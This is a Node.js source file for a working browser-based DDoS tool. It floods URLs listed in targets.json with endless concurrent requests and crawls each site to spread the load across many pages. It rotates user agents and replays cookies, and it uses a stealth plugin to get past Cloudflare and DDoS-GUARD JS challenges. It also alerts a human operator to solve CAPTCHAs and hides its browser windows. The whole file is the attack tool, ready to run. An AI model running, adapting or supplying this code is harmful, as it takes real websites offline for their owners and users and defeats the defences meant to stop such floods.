#!/usr/bin/env nodejs

/*
    apt update
    apt install npm
    npm install --save puppeteer puppeteer-extra puppeteer-extra-plugin-stealth axios minimist
*/

let settings = {
    consecutivePlainRequestsLimit: 20,
    delayAfterIteration: 50,
    simultaneousBrowserNavigationsLimit: 100,
    waitForCaptchaResolutionTimeout: 10 * 60,
    waitForChallengeDisapearTimeout: 60
}

//------------------------------------------------------------------------------

const fs = require('fs');
const util = require('util');
const axios = require('axios').default;
const minimist = require('minimist')(process.argv.slice(2));

let tempDir = val(()=> minimist['working-directory']);
if (!tempDir) {
    tempDir = '/tmp/puppeteer-ddos/process-' + process.pid;
}

const debugBrowserCache = false;
const userDataDir     = tempDir + '/browser-cache';
const dumpScreenShots = false;
const screenShotDir   = tempDir + '/dump-screenshots';
const dumpHtml        = false;
const dumpHtmlDir     = tempDir + '/dump-html';
settings.entryUrls    = JSON.parse(fs.readFileSync(__dirname + '/targets.json'));

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'
];

//------------------------------------------------------

fs.rmdirSync(tempDir, { recursive: true, force: true });
fs.mkdirSync(userDataDir, { recursive: true });
fs.mkdirSync(screenShotDir, { recursive: true });
fs.mkdirSync(dumpHtmlDir, { recursive: true });

let glob = {
    puppeteer: require('puppeteer-extra'),
    stealthPlugin: require('puppeteer-extra-plugin-stealth'),
    term: {
        clear: "\033[0m",
        red:   "\033[31m",
        green: "\033[32m"
    },
    threadsDoingBrowserNavigationCount: 0,
    connectionIndex: val(()=> minimist['connection-index']),
    blockerType: {
        none: 0,
        challenge: 1,
        captcha: 2,
        restriction: 3,
        failedToLoad: 9
    }
}
glob.puppeteer.use(glob.stealthPlugin());

class Thread
{
    id;
    entryUrl;
    userAgent;
    puppeteerOptions = {
        headless:    false,
        userDataDir,
        defaultViewport: { width: 1280, height: 720 - 40 }
    }
    //--
    currentUrl;
    previousUrl = '';
    browser;
    browserPage;
    isBrowserVisible;
    browserWids;
    links         = [];
    badLinks      = [];
    cookies       = [];
    //--
    requireBlockerBypass = glob.blockerType.challenge;
    bypassSuccessfulCount = 0;
    bypassFailedCount = 0;
    requireTerminate = false;
    terminateMessage = '';
    consecutivePlainIterationsCount;
    iterationsCount = 0;
    failedIterationsCount = 0;
    successfulIterationsCount = 0;
    logBuffer;
    logObject;
    networkRequestsCount;
    diskRequestsCount;
    failedRequestsUrls;
    startedAt;

    constructor(id, entryUrl)
    {
        this.id = id;
        this.entryUrl = entryUrl;
        this.consecutivePlainIterationsCount = getRandomInteger(0, settings.consecutivePlainRequestsLimit / 2); // Spread in time
        this.userAgent = randomArrayItem(userAgents);
        this.puppeteerOptions.userDataDir = userDataDir + '/thread-' + this.id;
        fs.mkdirSync(this.puppeteerOptions.userDataDir, { recursive: true });
    }

    async run()
    {
        await this.#sleep(this.id * 1000);

        while(true) {

            this.networkRequestsCount = 0;
            this.diskRequestsCount    = 0;
            this.failedRequestsUrls   = [];
            this.startedAt = new Date().getTime();

            // ------------
            this.logObject = {
                thread: this.id,
                entryUrl: this.entryUrl,
                message: ''
            };

            if (this.requireTerminate) {
                await this.#terminateThread();
                return;
            }

            // ------------

            let errorMessage = false;

            if (
                    this.iterationsCount            >= 10
                &&  this.successfulIterationsCount === 0
            ) {
                errorMessage = "Can't connect to target website through current Internet connection or VPN";
            }

            if (
                    this.iterationsCount > 20
                &&  this.links.length    < 10
            ) {
                errorMessage = `Not enough links collected (${this.links.length})`;
            }

            if (
                    this.iterationsCount > 50
                &&  this.failedIterationsCount > this.successfulIterationsCount / 2
            ) {
                errorMessage = `Too many failed connections (${this.failedIterationsCount} of ${this.successfulIterationsCount})`;
            }

            if (errorMessage) {
                this.terminateMessage += 'Error: ' + errorMessage;
                this.requireTerminate = true;
                continue;
            }

            // ------------

            this.previousUrl = this.currentUrl;
            if (this.links.length) {
                for (let i = 0 ; i < 1000 ; i++) {
                    this.currentUrl = randomArrayItem(this.links);
                    if (this.badLinks.indexOf(this.currentUrl) === -1) {
                        break;
                    }
                }
            } else {
                this.currentUrl = this.entryUrl;
            }

            // ------------

            let success;
            if (
                    this.requireBlockerBypass
                ||  this.consecutivePlainIterationsCount >= settings.consecutivePlainRequestsLimit
            ) {

                if (glob.threadsDoingBrowserNavigationCount >= settings.simultaneousBrowserNavigationsLimit) {
                    this.logObject.message += "Too many browsers. Wait\n";
                    while (glob.threadsDoingBrowserNavigationCount >= settings.simultaneousBrowserNavigationsLimit) {
                        await this.#sleep(500);
                    }
                }
                glob.threadsDoingBrowserNavigationCount++;

                // ---

                success = await this.#navigateAndRenderInBrowser();
                glob.threadsDoingBrowserNavigationCount--;
                if (success) {
                    this.consecutivePlainIterationsCount = 0;
                }

                if (this.requireBlockerBypass) {
                    await this.#sleep(1000);
                }

            } else {
                success = await this.#navigateWithoutRender();
                this.consecutivePlainIterationsCount++;
            }

            this.iterationsCount++;
            if (success) {
                this.successfulIterationsCount++;
            } else {
                this.failedIterationsCount++;
            }

            this.logObject.success                   = success;
            this.logObject.iterationsCount           = this.iterationsCount;
            this.logObject.successfulIterationsCount = this.successfulIterationsCount;
            this.logObject.failedIterationsCount     = this.failedIterationsCount;
            this.logObject.type                      = 'http-get';
            this.logObject.currentUrl                = this.currentUrl;
            this.logObject.previousUrl               = this.previousUrl;
            this.logObject.cookiesCount              = this.cookies.length;
            this.logObject.linksCount                = this.links.length;
            this.logObject.badLinksCount             = this.badLinks.length;
            this.logObject.requireBlockerBypass      = this.requireBlockerBypass;
            this.logObject.bypassSuccessfulCount     = this.bypassSuccessfulCount;
            this.logObject.bypassFailedCount         = this.bypassFailedCount;
            this.logObject.networkRequestsCount      = this.networkRequestsCount;
            this.logObject.diskRequestsCount         = this.diskRequestsCount;
            this.logObject.failedRequestsUrls        = this.failedRequestsUrls;
            this.logObject.duration                  = Math.floor(new Date().getTime() - this.startedAt);
            
            this.#printLogObject(this.logObject, !success);
            await this.#sleep(settings.delayAfterIteration);
        }
    }

    #terminateThread = async function ()
    {
        this.logObject.type    = 'terminate';
        this.logObject.message = this.terminateMessage;
        this.#printLogObject(this.logObject);

        try {
            await this.browser.close();
        } catch (e) {}
    }

    #navigateWithoutRender = async function ()
    {
        let ret = false;

        let httpStatusCode,
            pageContent,
            responseHeaders,
            maxContentLengthExceeded = false;

        this.logObject.httpGetType = 'plain';

        main: {
            let headers = {
                'accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US',
                'cache-control':   'no-cache',
                'pragma':          'no-cache',
                'user-agent':      this.userAgent
            }

            if (this.previousUrl) {
                headers.referer = this.previousUrl;
            }

            this.networkRequestsCount = 1;

            //---

            let cookieString = '';
            for (let cookie of this.cookies) {
                cookieString += cookie.name + '=' + cookie.value + ';';
            }
            if (cookieString) {
                headers.cookie = cookieString;
            }

            //---

            let responseObject, errorResponseObject;
            let axiosOptions = {
                url:     this.currentUrl,
                method:  'get',
                maxContentLength: 512 * 1024,
                headers: headers
            };

            //---

            /*if (this.links.length > 10) {
                if (getRandomInteger(0, 1)) {
                    axiosOptions.maxContentLength = getRandomInteger(15, 25) * 1024;
                } else {
                    axiosOptions.maxContentLength = 500 * 1024;
                }
                this.log('Save network. Reduce the response size to ' + axiosOptions.maxContentLength);
            } else {
                axiosOptions.maxContentLength = 50 * 1024 * 1024;
            }*/

            //---

            await axios(axiosOptions)
            .then( function (_response) {
                responseObject = _response;
            })
            .catch( function (_response) {
                errorResponseObject = _response;
            });

            //---

            if (responseObject) {
                httpStatusCode  = val( () => responseObject.status );
                responseHeaders = val( () => responseObject.headers );
                pageContent     = val( () => responseObject.data );
            } else if (errorResponseObject) {

                if (errorResponseObject.response) {
                    // The request was made and the server responded with a status code
                    // that falls out of the range of 2xx
                    httpStatusCode  = val( () => errorResponseObject.response.status );
                    responseHeaders = val( () => errorResponseObject.response.headers );
                    pageContent     = val( () => errorResponseObject.response.data );
                } else if (errorResponseObject.request) {
                    // The request was made but no response was received
                    httpStatusCode = -1;
                    let errorName    = val( () => errorResponseObject.name );
                    let errorMessage = val( () => errorResponseObject.message );

                    if (
                            errorName === 'AxiosError'
                        &&  errorMessage.includes('maxContentLength')
                        &&  errorMessage.includes('exceeded')
                    ) {
                        maxContentLengthExceeded = true;
                        //this.log(errorResponseObject.request._header);
                    } else {
                        if (errorName) {
                            this.logObject.message += errorName + ': ';
                        }
                        if (errorMessage) {
                            this.logObject.message += errorMessage;
                        }
                        if (errorName  ||  errorMessage) {
                            this.logObject.message += "\n";
                        }
                    }

                } else {
                    // Something happened in setting up the request that triggered an Error
                    httpStatusCode = -2;
                }
            }

            this.logObject.httpStatusCode = httpStatusCode;

            if (maxContentLengthExceeded) {
                this.logObject.message += "Max content length exceeded\n";
            } else {

                if (typeof (pageContent) === 'string') {
                    this.logObject.pageContentLength = pageContent.length;
                } else {
                    this.logObject.pageContentLength = 0;
                    this.logObject.message += "Page empty. Added to bad URLs list\n";
                    this.badLinks.push(this.currentUrl);
                    break main;
                }

                let responseContentType = val(() => responseHeaders['content-type']);
                this.logObject.responseContentType = responseContentType;
                this.requireBlockerBypass = this.#checkForBlocker(httpStatusCode, pageContent, []);

                if (!val(() => responseContentType.includes('text/html'))) {
                    this.logObject.message += "Wrong content type. Added to bad URLs list\n";
                    this.badLinks.push(this.currentUrl);
                } else if (this.requireBlockerBypass !== glob.blockerType.none) {
                    this.logObject.message += '"' + this.#getBlockerTypeTitle(this.requireBlockerBypass)  + "\" blocker detected\n";
                    break main;
                } else if (!this.#checkHttpStatusCode(httpStatusCode)) {
                    this.logObject.message += "Bad HTTP status code. Added to bad URLs list\n";
                    this.badLinks.push(this.currentUrl);
                } else {
                    await this.#extractLinks(pageContent);
                }
            }

            ret = true;
        }

        return ret;
    }

    #navigateAndRenderInBrowser = async function ()
    {
        let browserResponse;
        let httpStatusCode;
        let responseHeaders;
        let responseContentType;
        let pageContent;

        let ret = false;
        let requireBlockerBypassBeforeNavigate = this.requireBlockerBypass;
        let captchaWasFound = false;

        this.logObject.httpGetType = 'render';

        main: {
            if (!await this.#restartInvisibleBrowser()) {
                break main;
            }

            try {
                this.browserPage.setDefaultNavigationTimeout(5 * 60000);
                browserResponse = await this.browserPage.goto(this.currentUrl, { waitUntil: 'load' });
                this.browserPage.setDefaultNavigationTimeout(0);
            } catch (e) {
                this.logObject.message += "Go to URL failed\n";
                break main;
            }

            //---

            httpStatusCode = val( () => browserResponse.status() );
            this.logObject.httpStatusCode = httpStatusCode;

            //---

            pageContent = await this.#queryBrowser( async () => await this.browserPage.content() );
            if (!pageContent) {
                this.logObject.message += "Page empty. Added to bad URLs list\n";
                this.badLinks.push(this.currentUrl);
                break main;
            }  else {
                this.logObject.pageContentLength = pageContent.length;
            }

            //---

            responseHeaders     = val( () => browserResponse.headers() );
            responseContentType = val( () => responseHeaders['content-type'] );
            this.logObject.responseContentType = responseContentType;

            if (!val( () => responseContentType.includes('text/html') )) {
                this.logObject.message += "Wrong content type. Added to bad URLs list\n";
                this.badLinks.push(this.currentUrl);
                ret = true;
                break main;
            }

            //---

            let currentUrl = await this.#queryBrowser(async()=> await this.browserPage.url());
            if (!currentUrl  ||  !currentUrl.startsWith(this.entryUrl)) {
                this.logObject.message = `Browser went to another website (${currentUrl})\n`;
                this.logObject.message += this.terminateMessage;
                break main;
            }

            //---

            let pageAllFramesContent = await this.#getBrowserPageAllFramesContent();
            if (!pageAllFramesContent) {
                this.logObject.message += "Failed to get all frames content\n";
                break main;
            }

            this.requireBlockerBypass = this.#checkForBlocker(httpStatusCode, pageAllFramesContent, this.failedRequestsUrls);
            if (this.requireBlockerBypass === glob.blockerType.none) {
                if (!this.#checkHttpStatusCode(httpStatusCode)) {
                    this.logObject.message += "Bad status code. Added to bad URLs list\n";
                    this.badLinks.push(this.currentUrl);
                }
            } else {

                try {
                    let timeout = 0;
                    const delay = 1000;
                    let previousIterationBlockerType = -1;

                    do {
                        if (timeout) {
                            await this.#sleep(delay)
                        } else {
                            timeout = new Date().getTime() + settings.waitForChallengeDisapearTimeout * 1000;
                        }

                        // ---

                        if (! await this.#checkBrowserIsRunning()) {
                            this.logObject.message += "Browser was closed\n";
                            break main;
                        }

                        // ---

                        currentUrl = await this.#queryBrowser(async()=> await this.browserPage.url());
                        if (!currentUrl  ||  !currentUrl.startsWith(this.entryUrl)) {
                            this.logObject.message = `Browser went to another website (${currentUrl})\n`;
                            break main;
                        }

                        // ---

                        pageAllFramesContent = await this.#getBrowserPageAllFramesContent();
                        if (!pageAllFramesContent) {
                            this.logObject.message += "Failed to get all frames content\n";
                            continue;
                        }

                        // ---

                        this.requireBlockerBypass = this.#checkForBlocker(httpStatusCode, pageAllFramesContent, this.failedRequestsUrls);
                        if (this.requireBlockerBypass !== glob.blockerType.none) {

                            if (this.requireBlockerBypass === glob.blockerType.failedToLoad) {
                                this.logObject.message = "The blocker failed to load from this IP\n";
                                break main;
                            } else if (this.requireBlockerBypass === glob.blockerType.captcha) {
                                if (!captchaWasFound) {
                                    captchaWasFound = true;
                                    timeout = new Date().getTime() + settings.waitForCaptchaResolutionTimeout * 1000;
                                    // ---
                                    let windowTitle = isNaN(glob.connectionIndex)  ?  '' : ('VPN' + glob.connectionIndex + ' ');
                                    windowTitle += 'Captcha';
                                    await this.browserPage.evaluate(`document.title = '${windowTitle}'`);
                                    await this.#setBrowserWindowVisible(true);
                                    // ---
                                    this.#printLogObject({
                                        thread:               this.id,
                                        currentUrl:           this.currentUrl,
                                        requireBlockerBypass: glob.blockerType.captcha,
                                    });
                                    if (val(()=> minimist['play-sound']) !== 'false') {
                                        await execShellCommand('/usr/bin/music123 /usr/share/sounds/freedesktop/stereo/complete.oga');
                                    }
                                }
                            } else if (this.requireBlockerBypass === glob.blockerType.challenge) {
                                let windowTitle = isNaN(glob.connectionIndex)  ?  '' : ('VPN' + glob.connectionIndex + ' ');
                                windowTitle += 'Challenge';
                                await this.browserPage.evaluate(`document.title = '${windowTitle}'`);
                            }

                            if (previousIterationBlockerType !== this.requireBlockerBypass) {
                                this.logObject.message += '"' + this.#getBlockerTypeTitle(this.requireBlockerBypass)  + "\" blocker detected\n";
                            }

                        } else {
                            break;
                        }

                        // ---

                        previousIterationBlockerType = this.requireBlockerBypass;
                    } while (new Date().getTime() < timeout);

                } catch (e) {
                    this.logObject.message += "Challenge/Captcha detection loop failed\n";
                    this.logObject.message += e.toString();
                    break main;
                }
            }

            await this.#setBrowserWindowVisible(false);

            if (requireBlockerBypassBeforeNavigate !== glob.blockerType.none) {
                switch (this.requireBlockerBypass) {
                    case glob.blockerType.none:
                        this.bypassSuccessfulCount++;
                        this.logObject.message += "Bypass success\n";
                    break;

                    case glob.blockerType.captcha:
                        this.terminateMessage = "Captcha was not resolved by user\n";
                        this.logObject.message += this.terminateMessage;
                        this.requireTerminate = true;
                        break main;
                    break;

                    default:
                        this.bypassFailedCount++;
                        this.logObject.message += "Bypass failed\n";
                        this.logObject.bypassFailedPageContent = pageContent;
                        break main;
                }
            }

            //---

            pageContent = await this.#queryBrowser( async () => await this.browserPage.content()  );
            this.cookies = await this.#queryBrowser( async () => await this.browserPage.cookies()  );
            if (!pageContent  ||  !this.cookies) {
                this.logObject.message += "Page scrap failed\n";
            } else {
                this.#extractLinks(pageContent);
            }

            this.requireBlockerBypass = glob.blockerType.none;
            ret = true;

            //---

            try {
                if (dumpScreenShots) {
                    await this.browserPage.screenshot({ path: screenShotDir + '/' + encodeURIComponent(this.currentUrl) + '.png', fullPage: true })
                }

                if (dumpHtml) {
                    fs.writeFileSync(dumpHtmlDir + '/' + encodeURIComponent(this.currentUrl) + '.html', await this.browserPage.content());
                }
            } catch (e) {}

        }  // end of main

        return ret;
    }

    #checkBrowserIsRunning = async function()
    {
        let browserRunning;
        try {
            browserRunning = await this.browser.isConnected();
        } catch (e) {
            browserRunning = false;
        }
        return browserRunning;
    }

    #restartInvisibleBrowser = async function()
    {
        let ret = true;

        if (! await this.#checkBrowserIsRunning()) {
            ret = false;
            this.browser = undefined;
            let timeout = new Date().getTime() + 10 * 1000;

            do {

                let runningBrowsersPids = await getRunningBrowsersPids();
                if (runningBrowsersPids.length >= 50) {
                    this.logObject.message += "Too many browsers launched. Wait\n";
                    while (runningBrowsersPids.length >= 50) {
                        await this.#sleep(1000);
                    }
                }

                try {
                    this.logObject.message += "Launching browser\n";
                    this.browser = await glob.puppeteer.launch(this.puppeteerOptions);
                    if (this.browser) {
                        if (await this.#openBrowserPage()) {
                            this.isBrowserVisible = true;
                            await this.#setBrowserWindowVisible(false);
                            ret = true;
                            break;
                        }
                    }
                } catch (e) {
                    this.logObject.message += e.toString() + "\n";
                }

                await this.#closeBrowser();
                this.logObject.message += "Failed to launch browser. Wait\n";
                await this.#sleep(1000);
            } while (new Date().getTime() < timeout)
        }

        return ret;
    }

    #openBrowserPage = async function() {

        let timeout = new Date().getTime() + 10 * 1000;
        do {
            try {

                //---

                let browserPages = await this.browser.pages();
                let browserPagesKeys = Object.keys(browserPages);
                this.browserPage = browserPages[browserPagesKeys[0]];

                if (this.browserPage.url() === 'about:blank') {

                    await this.#queryBrowser( async () => await this.browserPage.setUserAgent(this.userAgent) );
                    if (this.previousUrl) {
                        await this.#queryBrowser( async () => await this.browserPage.setExtraHTTPHeaders({referer: this.previousUrl}) );
                    }

                    for (let cookie of this.cookies) {
                        await this.browserPage.setCookie(cookie);
                    }

                    //---

                    await this.browserPage.setRequestInterception(true);
                    this.browserPage.on('request', (request) => {
                        let skipRequestTypes  = [
                            'font',
                        ];

                        if (skipRequestTypes.indexOf(request.resourceType()) === -1) {
                            request.continue();
                        } else {
                            request.abort();
                        }
                    });

                    //---

                    this.browserPage.on('response', (response) => {

                        let source = response._fromDiskCache ? 'disk' : 'network';
                        if (source === 'disk') {
                            this.diskRequestsCount++;
                        } else {
                            this.networkRequestsCount++;
                        }

                        if (debugBrowserCache) {
                            let url = response.url().substring(0, 120);
                            this.logObject.message += `${source} ${url}\n`;
                        }
                    });


                    this.browserPage.on('requestfailed', (request) => {
                        this.failedRequestsUrls.push(request.url());
                    });
                }

                return true;
            } catch (e) {
                this.logObject.message += e.toString() + "\n";
            }
            await this.#closeBrowserPage();
            this.logObject.message += "Failed to launch browser page. Wait\n";
            await this.#sleep(1000);
        } while (new Date().getTime() < timeout)

        return false;
    }

    #getBrowserPageAllFramesContent =  async function() {

        let ret = '';
        let framesFound = 0;
        let walkFrameTree = async (frame) => {
            framesFound++;
            //ret += "---------------------------------------------------------- Frame: " + frame.url() + " ----------------------------------------------------------\n";
            let frameContent = await this.#queryBrowser(async()=> await frame.content());
            if (!frameContent) {
                return;
            }
            ret += frameContent;
            for (const child of frame.childFrames()) {
                await walkFrameTree(child);
            }
        }
        await walkFrameTree(this.browserPage.mainFrame());
        //ret += "---------------------------------------------------------- " + framesFound + " frames were found ----------------------------------------------------------\n";
        return ret;
    }

    #closeBrowser = async function()
    {
        try {
            if (this.browser) {
                await this.#queryBrowser(async () => await this.browser.close());
            }
        } catch (e) {}
        this.browse = undefined;
    }

    #closeBrowserPage = async function()
    {
        try {
            if (this.browserPage) {
                await this.#queryBrowser(async () => await this.browserPage.close());
            }
        } catch (e) {}
        this.browserPage = undefined;
    }

    #readBrowserWids  = async function()
    {
        let pid = this.browser.process().pid;
        let execRet = await execShellCommand('/usr/bin/xdotool  search  --onlyvisible  --pid ' + pid);
        if (!execRet.error) {
            this.browserWids = execRet.stdout.trim().split("\n");
        }
    }

    #setBrowserWindowVisible = async function(state) {

        if (this.isBrowserVisible === state) {
            return;
        }

        if (this.isBrowserVisible) {
            await this.#readBrowserWids();
        }

        //let command1 = state ? ''            : 'windowminimize';  //'windowraise'
        let command2 = state ? 'windowmap'   : 'windowunmap';
        let windowWidth = this.puppeteerOptions.defaultViewport.width;
        let windowHeight = this.puppeteerOptions.defaultViewport.height + 120;

        for (let wid of this.browserWids) {
            await execShellCommand(    `/usr/bin/xdotool  ${command2}  --sync  ${wid}`);
            if (state) {
                await execShellCommand(`/usr/bin/xdotool  windowsize   --sync  ${wid}   ${windowWidth}   ${windowHeight}`);
            }
        }

        this.isBrowserVisible = state;
    }

    #queryBrowser = async function(asyncCallback) {

        const timeout = new Date().getTime() + 10 * 1000;
        const delay   = 500;

        let timeoutPromise =  new Promise(
            (resolve, reject) => {
                setTimeout(reject, 500);
            }
        );

        let promises = [
            asyncCallback.call(),
            timeoutPromise
        ]

        do {
            try {
                return await Promise.race(promises);
            } catch (e) {};

            await this.#sleep(delay)
        } while (new Date().getTime() < timeout);

        return null;
    }

    #extractLinks = function(htmlContent)
    {
        let linkUrls = [];

        let regExps = [
            /href\s*?=\s*?'(.*?)'/gu,
            /href\s*?=\s*?"(.*?)"/gu
        ];

        for (let regExp of regExps) {
            let m;
            do {
                m = regExp.exec(htmlContent);
                if (m) {
                    linkUrls.push(m[1]);
                }
            } while (m);
        }

        //---

        let navigatableUrls = [];
        for (let linkUrl of linkUrls) {
            let expandedUrl = expandSubUrl(this.currentUrl, linkUrl);
            if (this.#isLinkGoodForNavigation(expandedUrl)) {
                navigatableUrls.push(encodeURI(expandedUrl));
            }
        }

        this.links = this.links.concat(navigatableUrls);
        this.links = arrayUnique(this.links);
    }

    #isLinkGoodForNavigation = function(expandedUrl)
    {
        if (!expandedUrl.startsWith(this.entryUrl)) {
            return;
        }

        let urlExpandedObject = new URL(expandedUrl);
        let skipList = [
            '#',

            '.css',
            '.gif',
            '.jpeg',
            '.jpg',
            '.png',
            '.ico',

            '.js',
            '.css',

            '.pdf',
            '.zip'
        ]

        for (let skipStr of skipList) {
            if (urlExpandedObject.pathname.includes(skipStr)) {
                return false;
            }
        }

        return true;
    }

    #getBlockerTypeTitle = function(blockerTypeCode)
    {
        switch (blockerTypeCode) {
            case glob.blockerType.none:
                return 'No blocker';
            break;

            case glob.blockerType.challenge:
                return 'JS challenge';
            break;

            case glob.blockerType.captcha:
                return 'Captcha';
            break;

            case glob.blockerType.restriction:
                return 'Complete restriction';
            break;

            case glob.blockerType.failedToLoad:
                return 'Blocker failed to load';
            break;

            default:
                return 'Unknown blocker';
        }
    }

    /**
     *
     * @param httpStatusCode
     * @param bodyContent
     * @returns {number}  0 - No blocker; 1 - JS challenge; 2 - Captcha; 3 - Complete restriction; 9 - malfunction
     */
    #checkForBlocker = function(httpStatusCode, bodyContent, failedRequestsUrls)
    {
        if (httpStatusCode === 503) {
            // CloudFlare

            if (includesAny(bodyContent, ['The site owner may have set restrictions that prevent you from accessing the site'])) {
                return 3;
            } else if (bodyContent.includes('hcaptcha.com')) {
                if (failedRequestsUrls.join().includes('hcaptcha.com')) {
                    return 9;
                } else if (bodyContent.includes('I am human')) {
                    return 2;
                } else {
                    return 1;
                }
            } else if (bodyContent.includes('CloudFlare')) {
                return 1;
            }

        } else if (includesAny(bodyContent, ['DDoS-GUARD', 'DDOS-GUARD'])) {
            if (failedRequestsUrls.join().includes('hcaptcha.com')) {
                return 9;
            } else if (bodyContent.includes('I am human')) {
                return 2;
            } else {
                return 1;
            }
        }

        return 0;
    }

    #checkHttpStatusCode = function(code)
    {
        let acceptHttpStatusCodes = [
            200,  // Ok
        ];
        return acceptHttpStatusCodes.indexOf(code) !== -1;
    }

    #printLogObject = function(logObject, hasError = false)
    {
        //let asString = JSON.stringify(this.logObject , null, 2);
        let asString = JSON.stringify(logObject);
        if (hasError) {
            asString = glob.term.red + asString + glob.term.clear;
        }
        console.log(asString);
    }

    #sleep = async function(ms)
    {
        //this.#printLogObject();
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    log = function(message, hasError = false, newLinesAfter = 1)
    {
        let messageDataType = typeof(message);
        let castToStringTypes = [
            'undefined',
            'boolean',
            'number',
            'bigint',
            'string'
        ]

        if (castToStringTypes.indexOf(messageDataType) === -1) {
            message = util.inspect(message);
        }

        //---

        if (hasError) {
            message = glob.term.red + message + glob.term.clear;
        }
        message += "\n".repeat(newLinesAfter);

        if (false) {
            console.log(this.id + ' ' + message);
        } else {
            this.logBuffer += message;
        }
    }

}

//-------------------------------------------------------------------

function randomArrayItem(array)
{
    return array[Math.floor(Math.random()*array.length)];
}

function arrayUnique(arr)
{
    return arr.filter((v, i, a) => a.indexOf(v) === i);
}

function includesAny(checkString, includeParts)
{
    for(let includePart of includeParts) {
        if (checkString.includes(includePart)) {
            return true;
        }
    }
    return false;
}

function expandSubUrl(currentUrl, subUrl)
{
    let currentUrlObject = new URL(currentUrl);
    if (subUrl.startsWith('//')) {
        subUrl = currentUrlObject.protocol + subUrl;
    } else if (
        subUrl.startsWith('/')
        ||  subUrl.startsWith('./')
    ) {
        subUrl = currentUrlObject.origin + subUrl;
    }

    return subUrl;
}

function getRandomInteger(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const exec = require('child_process').exec;
async function execShellCommand(cmd)
{
    return new Promise((resolve, reject) => {
        exec(cmd, (error, stdout, stderr) => {
            let ret = {
                stdout: stdout,
                stderr: stderr,
                error:  false
            };

            if (error) {
                ret.error = error;
            }

            resolve(ret);
        });
    });
}

function val(getValueCallback)
{
    try {
        return getValueCallback.call();
    } catch (e) {
        return undefined;
    }
}

async function getPuppeteerDdosProcessesPids()
{
    let ret = [];
    let execRet = await execShellCommand('ps xao pid=,cmd= | grep puppeteer-ddos.cli.js');
    if (execRet.error) {
        return ret;
    }

    let psLines = execRet.stdout.trim().split("\n");
    for (let psLine of psLines) {
        let matches = psLine.match(/^\s+(\d+)\s+(\S+)/);
        let pid = val(()=> matches[1]);
        let app = val(()=> matches[2]);

        if (   pid
            && app
            && app.includes('nodejs')
        ) {
            ret.push(parseInt(pid));
        }
    }

    return ret;
}

async function getRunningBrowsersPids()
{
    let ret = [];
    let puppeteerDdosProcessesPids = await getPuppeteerDdosProcessesPids();
    let execRet = await execShellCommand('ps xao pid=,ppid,cmd=');
    if (execRet.error) {
        return ret;
    }
    let psLines = execRet.stdout.trim().split("\n");
    for (let psLine of psLines) {
        let matches = psLine.match(/^\s+(\d+)\s+(\d+)\s+(\S+)/);
        let pid  = val(()=> matches[1]);
        let ppid = val(()=> matches[2]);
        let app  = val(()=> matches[3]);

        ppid = parseInt(ppid);

        if (   pid
            && app
            && app.includes('chrome')
            && puppeteerDdosProcessesPids.indexOf(ppid) !== -1
        ) {
            ret.push(parseInt(pid));
        }
    }
    return ret;
}

function jsonConsoleLog(message)
{
    let asString = JSON.stringify({ message: message});
    console.log(asString);
}

//-------------------------------------------------------------------

(async function launchThreads()
{
    process.setMaxListeners(Infinity);
    let threads = [];
    let threadId = 0;
    for (let entryUrl of settings.entryUrls) {
        threads[threadId] = new Thread(threadId, settings.entryUrls[threadId]);
        threads[threadId].run();
        threadId++;
    }
})();